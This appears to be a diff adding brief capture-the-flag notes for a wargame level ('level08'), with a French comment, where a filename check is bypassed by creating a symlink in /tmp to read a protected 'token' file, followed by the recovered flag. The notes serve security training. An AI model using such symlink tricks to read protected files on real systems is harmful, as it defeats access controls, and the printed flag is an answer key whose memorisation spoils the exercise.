@@ -1,0 +1,8 @@
+./level08 token
+You may not access 'token'
+strings level08 -> a cause du nom de fichier token
+ 
+ln -s /home/user/level08/token /tmp/flag08
+
+./level08 /tmp/flag08
+quif5eloekouj29ke0vouxean
